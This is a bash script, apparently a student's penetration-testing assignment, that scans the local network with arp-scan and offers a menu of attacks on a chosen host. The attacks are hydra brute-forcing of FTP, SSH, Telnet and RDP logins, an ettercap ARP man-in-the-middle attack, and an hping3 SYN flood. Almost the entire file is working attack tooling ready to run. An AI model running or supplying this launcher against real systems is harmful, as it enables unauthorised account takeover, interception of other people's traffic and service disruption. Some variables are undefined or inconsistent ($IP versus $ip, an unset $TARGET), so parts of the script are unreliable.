#!/bin/bash

#Student name: Dean 


	#Check if the user is root
	if [ "$(whoami)" != "root" ]; then
		echo -e "\033[1;32m This script must be run as root.\e[0m"
	exit 

	else 
		echo -e "\033[1;32m You are running as root. Proceeding with the script.\e[0m"

	fi
	
	#updating function
	function UPDATE()
{
		echo -e "\033[1;32m Cheacking for updates.\e[0m"
		apt-get -qqy update
		echo -e "\033[1;32m The system is up to date.\e[0m"
}
	 UPDATE


function INSTALLS() {

# check if hydra is installed and installs it if not.
		if ! command -v hydra &>/dev/null; 
		then
			echo -e "\033[1;31m hydra is not installed, starting installation\033[0m"
			sudo apt-get -qqy install hydra
			echo -e "\033[1;32m hydra has been installed.\e[0m"
		else
			echo -e "\033[1;32m hydra is installed\e[0m."
			
		fi
		
		

# check if arp-scan is installed and installs it if not.
		if ! command -v arp-scan &>/dev/null; 
		then
			echo -e "\033[1;31m arp-scan is not installed, starting installation\033[0m"
			sudo apt-get -qqy install arp-scan
			echo -e "\033[1;32m arp-scan has been installed.\e[0m"
		else
			echo -e "\033[1;32m arp-scan is installed\e[0m."
			
		fi
		
		
		
# check if ettercap is installed and installs it if not.
		if ! command -v ettercap &>/dev/null; 
		then
			echo -e "\033[1;31m ettercap is not installed, starting installation\033[0m"
			sudo apt-get -qqy install ettercap-text-only
			echo -e "\033[1;32m ettercap has been installed.\e[0m"
		else
			echo -e "\033[1;32m ettercap is installed\e[0m."
			
		fi
		

# check if hping3 is installed and installs it if not.
		if ! command -v hping3 &>/dev/null; 
		then
			echo -e "\033[1;31m hping3 is not installed, starting installation\033[0m"
			sudo apt-get -qqy install hping3
			echo -e "\033[1;32m hping3 has been installed.\e[0m"
		else
			echo -e "\033[1;32m hping3 is installed\e[0m."
			
		fi
		


}






	#A function to notify which ips exist. (variable $ip)
	function IP_SCAN()
	{

	# Use arp-scan to list active IP addresses on the local network
		mapfile -t ips < <(arp-scan --localnet -g| grep -E "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | awk '{print $1}')

	# Check if there are any IPs found
	if [ ${#ips[@]} -eq 0 ]; then
		echo -e "\033[1;31m No active IPs found on the network. \e[0m"
		exit 1
	fi

	# Use select to allow the user to choose an IP  (variable $ip) 
		echo -e "\033[1;34m Select an active IP address:  \e[0m"
		select ip in "${ips[@]}"; do
	if [[ -n $ip ]]; then
	
		echo -e "\033[1;32m  You selected IP: $ip \e[0m"
		break
	else
		
		echo -e "\033[1;32m Invalid selection. Please try again. \e[0m"
		
	fi
	done
	
	}


	#A function to notify which type of scan options exist. (variable $PASSLST)
	function PASSWORD_LIST()
	{
		
		
		#A selection menu for the user.
		echo -e "\033[1;34m Choose an option: \e[0m"
		echo -e "\033[1;34m 1. insert a pasaword list \e[0m"
		echo -e "\033[1;34m 2. Use the default password list \e[0m"
		read -p "Enter the number of your choice: " PLIST

		case $PLIST in
			1)
			#Ask's for the password list path
			read -p "Enter the path to the password list: " PASSLST
        
        ;;
			2)
			#Use the default password list.
			PASSLST=list/passwords.lst
			#you can change the list to the rockyou.txt file
			##PASSLST=/usr/share/wordlists/rockyou.txt
			#at first the rockyou file is zipped ,if you didn't unzip it
			#the file won't work 
			#to unzip use the command:  sudo gunzip /usr/share/wordlists/rockyou.txt.gz

        ;;
			*)
			# For any other input, display an error message and exit.
			echo -e "\033[1;34m Invalid choice. Exiting. \e[0m"
			exit 1
        ;;
	esac

	}
	

	#A function to notify which type of scan options exist. (variable $USERLST)
	function USER_LIST()
	{
		#A selection menu for the user.
		echo -e "\033[1;34m Choose an option: \e[0m"
		echo -e "\033[1;34m 1. insert a user list \e[0m"
		echo -e "\033[1;34m 2. Use the default user list \e[0m"
		read -p "Enter the number of your choice: " ULIST

		case $ULIST in
			1)
			#Ask's for the user list path
			read -p "Enter the path to the user list: " USERLST
        
        ;;
			2)
			#Use the default user list.
			USERLST=list/users.lst
			

        ;;
			*)
			# For any other input, display an error message and exit.
			echo -e "\033[1;34m Invalid choice. Exiting. \e[0m"
			exit 1
        ;;
	esac

	}	
	
	

	# Function to notify the user of available scan options
	function ATTCKS() {
    # Display the selection menu
		echo -e "\033[1;34m Choose an option: \e[0m"
		echo -e "\033[1;34m 1. FTP brute force attack \e[0m"  # Attempts to crack FTP credentials through repeated guessing.
		echo -e "\033[1;34m 2. SSH brute force attack \e[0m"  # Attempts to access SSH by guessing passwords repeatedly.
		echo -e "\033[1;34m 3. Telnet brute force attack \e[0m"  # Tries to break into Telnet by repeatedly guessing user credentials.
		echo -e "\033[1;34m 4. RDP brute force attack \e[0m"  # Repeatedly attempts to penetrate RDP to gain control.
		echo -e "\033[1;34m 5. MITM attack \e[0m"  # Intercepts communications between two parties to steal or manipulate data.
		echo -e "\033[1;34m 6. DDOS attack \e[0m"  # Overwhelms a target with traffic to disrupt service.
		echo -e "\033[1;34m 7. Randomly select an attack \e[0m"  # Chooses any of the above attacks at random.
		read -p "Enter the number of your choice: " BFAT


		
	# Ensure the log directory and file exists	
	mkdir -p /var/log/attack_tester/
    touch /var/log/attack_tester/attacker.log
    chmod 664 /var/log/attack_tester/attacker.log
		
    # Function to perform the selected attack
    perform_attack() {
		
		USER_LIST
		PASSWORD_LIST
        local attack_type=$1
        echo "$(date) - Starting ${attack_type} attack on $IP"
        sudo hydra -t 4 -L $USERLST -P $PASSLST ${attack_type}://$ip 
    }

    # Function to perform a MITM attack
    perform_mitm_attack() {
        echo "$(date) - Starting MITM attack on $IP"
        # Add your MITM attack command here
        sudo ettercap -T -M arp:remote /$ip// /$TARGET//
    }

    # Function to perform a DDOS attack
    perform_ddos_attack() {
        echo "$(date) - Starting DDOS attack on $IP"
        # Add your DDOS attack command here
        sudo hping3 -S --flood -V -p 80 $ip
    }

    case $BFAT in
        1)
			echo -e "\033[1;33m 1. FTP brute force attack: Attempts to crack FTP credentials through repeated guessing.  \e[0m"
            perform_attack "ftp" 2>&1 | tee -a /var/log/attack_tester/attacker.log
            ;;
        2)
            echo -e "\033[1;33m 2. SSH brute force attack: Attempts to access SSH by guessing passwords repeatedly.\e[0m"
            perform_attack "ssh" 2>&1 | tee -a /var/log/attack_tester/attacker.log
            ;;
        3)
            
            echo -e "\033[1;34m 3. Telnet brute force attack: Tries to break into Telnet by repeatedly guessing user credentials. \e[0m"  
            perform_attack "telnet" 2>&1 | tee -a /var/log/attack_tester/attacker.log
            ;;
        4)
			
			echo -e "\033[1;34m 4. RDP brute force attack: Repeatedly attempts to penetrate RDP to gain control. \e[0m"  
            perform_attack "rdp" 2>&1 | tee -a /var/log/attack_tester/attacker.log
            ;;
        5)
            echo -e "\033[1;34m 5. MITM attack: Intercepts communications between two parties to steal or manipulate data. \e[0m"  
            perform_mitm_attack 2>&1 | tee -a /var/log/attack_tester/attacker.log
            ;;
        6)
			echo -e "\033[1;34m 6. DDOS attack: DDOS attack Overwhelms a target with traffic to disrupt service. \e[0m"  
            perform_ddos_attack 2>&1 | tee -a /var/log/attack_tester/attacker.log
            ;;
        7)
            RANDOM_CHOICE=$((RANDOM % 6 + 1))
            case $RANDOM_CHOICE in
                1) perform_attack "ftp" 2>&1 | tee -a /var/log/attacker.log ;;
                2) perform_attack "ssh" 2>&1 | tee -a /var/log/attacker.log ;;
                3) perform_attack "telnet" 2>&1 | tee -a /var/log/attacker.log ;;
                4) perform_attack "rdp" 2>&1 | tee -a /var/log/attacker.log ;;
                5) perform_mitm_attack 2>&1 | tee -a /var/log/attacker.log ;;
                6) perform_ddos_attack 2>&1 | tee -a /var/log/attacker.log ;;
            esac
            ;;
        *)
            # For any other input, display an error message and exit
            echo -e "\033[1;34m Invalid choice. Exiting. \e[0m"
            exit 1
            ;;
    esac
}



# Call the function to display the menu and perform the selected attack

INSTALLS
IP_SCAN
ATTCKS
